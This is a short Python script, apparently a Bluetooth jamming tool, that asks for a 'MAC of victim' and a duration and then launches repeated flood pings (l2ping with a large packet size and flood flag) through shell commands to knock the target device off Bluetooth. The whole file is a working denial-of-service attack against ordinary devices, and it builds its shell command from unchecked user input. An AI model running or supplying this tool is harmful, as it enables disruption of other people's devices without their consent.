import os
import subprocess
import time
import colorama
from colorama import Fore, Back, Style
import headers
import random
colorama.init(autoreset=True)
def start():
    headers.header()

start()

mac = input("MAC of victim: ")
time = input("Time of jamming: ")
print("Start jamming...")
delay = int(time)

while delay != 0:
    xterm_1 = "timeout %ss l2ping -i hci0 -s 600 -f %s &" % (time, mac)
    subprocess.Popen(xterm_1,shell=True)
    print("meow")
    delay -= 1




